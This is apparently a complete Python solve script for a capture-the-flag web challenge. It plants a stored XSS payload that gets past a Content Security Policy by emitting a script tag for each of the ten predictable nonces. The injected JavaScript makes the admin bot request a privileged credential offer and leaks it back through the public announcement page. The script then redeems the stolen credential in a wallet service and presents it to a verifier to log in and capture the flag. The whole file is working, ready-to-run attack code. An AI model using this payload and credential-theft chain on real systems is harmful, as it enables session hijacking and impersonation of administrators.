#!/usr/bin/env python3
"""king-admin — full solve.

Chain:
  1. Stored XSS in the issuer's announcement. The admin page's CSP nonce is
     sha256(hint_script)[:6] over a *fixed* set of 10 hint messages, so the
     announcement carries one <script nonce=...> per possible nonce; the one
     matching the server's random pick executes.
  2. The XSS (running as the admin in the bot's browser) calls
     /api/admin/offer, obtaining the royal-administrator credential offer, and
     exfiltrates it by POSTing it back into /announcement (same-origin, no
     external listener needed). We read it from GET /.
  3. The offer is redeemed with the FortID Wallet Service (ews.fortid.com) as
     our wallet; the credential is then presented to the verifier's login
     session, which flips to AUTHORIZED and returns the flag.

Usage: python3 solve.py [ISSUER_ORIGIN] [VERIFIER_ORIGIN]
"""
import hashlib
import json
import re
import sys
import time
import urllib.parse

import requests

requests.packages.urllib3.disable_warnings()

if len(sys.argv) < 2:
    sys.exit('usage: solve.py ISSUER_ORIGIN [VERIFIER_ORIGIN]\n'
             '  e.g. solve.py https://issuer-<id>.inst11.ctf.fortid.com')
ISSUER = sys.argv[1].rstrip('/')
VERIFIER = (sys.argv[2] if len(sys.argv) > 2 else
            ISSUER.replace('issuer-', 'verifier-')).rstrip('/')

CAPE = 'https://cape.fortid.com'
EWS = 'https://ews.fortid.com'
MARK = 'LEAKED~'

HINT_MESSAGES = [
    "Hello, today is a very nice day. Have fun!",
    "A careful look at the page source may reveal something useful.",
    "Small details can make a big difference.",
    "The browser trusts some scripts more than others.",
    "Not every visible element is only decoration.",
    "Read the page carefully before interacting with it.",
    "Sometimes the answer is hidden in plain sight.",
    "The server may know more than the interface shows.",
    "Try to understand how this page is assembled.",
    "A little persistence can unlock unexpected results.",
]


def nonces():
    """The CSP nonce is sha256(hint_script)[:6] over a fixed 10-message list."""
    out = []
    for message in HINT_MESSAGES:
        hint_script = (
            "const banner=document.createElement('div');"
            f"banner.textContent={json.dumps(message)};"
            "banner.style.cssText='position:fixed;top:0;left:0;right:0;"
            "padding:12px;background:#ffe08a;color:#111;z-index:9999;"
            "text-align:center';document.body.prepend(banner);"
        )
        out.append(hashlib.sha256(hint_script.encode()).hexdigest()[:6])
    return out


def stage_xss():
    s = requests.Session()
    s.verify = False
    js = (
        "fetch('/api/admin/offer',{method:'POST',headers:{'X-CSRF-Token':"
        "document.querySelector('meta[name=csrf-token]').content}})"
        ".then(r=>r.json()).then(d=>{"
        "fetch('/announcement',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},"
        "body:'announcement='+encodeURIComponent('" + MARK + "'+(d.offer_uri||JSON.stringify(d)))})})"
    )
    payload = ''.join(f'<script nonce="{n}">{js}</script>' for n in nonces())
    r = s.post(ISSUER + '/announcement', data={'announcement': payload}, allow_redirects=False)
    assert r.status_code == 303, r.status_code
    print('[*] announcement stored')

    page = s.get(ISSUER + '/')
    csrf = re.search(r'name="csrf-token" content="([^"]+)"', page.text).group(1)
    r = s.post(ISSUER + '/api/bot/run',
               headers={'X-CSRF-Token': csrf, 'Origin': ISSUER, 'Referer': ISSUER + '/'})
    print('[*] bot run ->', r.status_code, r.text.strip()[:80])

    deadline = time.time() + 150
    while time.time() < deadline:
        time.sleep(5)
        page = s.get(ISSUER + '/')
        m = re.search(re.escape(MARK) + r'([^<\s"]+)', page.text)
        if m:
            offer = urllib.parse.unquote(m.group(1))
            print('[*] stolen offer:', offer[:140])
            return offer
    raise SystemExit('no offer captured')


def wallet_token():
    r = requests.post(CAPE + '/token', json={}, verify=False, timeout=20)
    r.raise_for_status()
    return r.json()['access_token']


def main():
    offer = stage_xss()

    tok = wallet_token()
    h = {'Authorization': 'Bearer ' + tok}
    w = requests.post(EWS + '/wallets', json={}, headers=h, verify=False, timeout=20).json()
    wid = w['walletId']
    print('[*] wallet:', wid)

    # --- issuance -------------------------------------------------------
    r = requests.post(f'{EWS}/wallets/{wid}/issue/initiate', json={'credentialOffer': offer},
                      headers=h, verify=False, timeout=30)
    print('[*] issue/initiate:', r.status_code, r.text[:200])
    r.raise_for_status()
    sid = r.json()['issuanceSessionId']
    cred_id = None
    for _ in range(20):
        time.sleep(3)
        st = requests.post(f'{EWS}/wallets/{wid}/issue/{sid}/session-status',
                           json={}, headers=h, verify=False, timeout=30).json()
        status = st.get('status')
        print('    issuance status:', status)
        if status == 'CONSENT_REQUEST_READY':
            requests.post(f'{EWS}/wallets/{wid}/issue/{sid}/consent',
                          json={'preAuthorizedCodeFlow': {}}, headers=h, verify=False, timeout=30)
        elif status == 'ISSUANCE_SUCCEEDED':
            cred_id = st.get('credentialId')
            break
        elif status == 'ISSUANCE_FAILED':
            raise SystemExit('issuance failed: ' + json.dumps(st)[:300])
    if not cred_id:
        raise SystemExit('issuance did not complete')

    creds = requests.get(f'{EWS}/wallets/{wid}/credentials', headers=h, verify=False, timeout=30).json()
    print('[*] wallet credentials:', json.dumps(creds)[:300])

    # --- verification ---------------------------------------------------
    vs = requests.Session()
    vs.verify = False
    vpage = vs.get(VERIFIER + '/')
    vcsrf = re.search(r'name="csrf-token" content="([^"]+)"', vpage.text).group(1)
    r = vs.post(VERIFIER + '/api/login',
                headers={'X-CSRF-Token': vcsrf, 'Origin': VERIFIER, 'Referer': VERIFIER + '/'})
    print('[*] verifier login:', r.status_code, r.text[:160])
    r.raise_for_status()
    auth_req = r.json()['authorization_request']

    r = requests.post(f'{EWS}/wallets/{wid}/verify/initiate', json={'authorizationRequest': auth_req},
                      headers=h, verify=False, timeout=30)
    print('[*] verify/initiate:', r.status_code, r.text[:200])
    r.raise_for_status()
    vsid = r.json()['verificationSessionId']

    selected = None
    for _ in range(20):
        time.sleep(3)
        st = requests.post(f'{EWS}/wallets/{wid}/verify/{vsid}/session-status',
                           json={}, headers=h, verify=False, timeout=30).json()
        status = st.get('status')
        print('    verify status:', status)
        if status == 'CONSENT_REQUEST_READY':
            mc = st.get('consentRequestObject', {}).get('matching_credentials', [])
            if mc:
                selected = mc[0]['id']
                requests.post(f'{EWS}/wallets/{wid}/verify/{vsid}/present',
                              json={'selectedCredentialId': selected}, headers=h,
                              verify=False, timeout=30)
        elif status == 'VERIFY_SUCCEEDED':
            break
        elif status == 'VERIFY_FAILED':
            print('    verify failed:', json.dumps(st)[:300])
            break

    # --- flag -----------------------------------------------------------
    for _ in range(20):
        time.sleep(4)
        st = vs.get(VERIFIER + '/api/login/status').json()
        print('    verifier status:', st.get('status'))
        if st.get('status') == 'AUTHORIZED':
            flag = st['flag']
            print('FLAG:', flag)
            open('FLAG.txt', 'w').write(flag + '\n')
            return flag
        if st.get('status') in ('DENIED', 'EXPIRED'):
            break
    raise SystemExit('no flag')


if __name__ == '__main__':
    main()
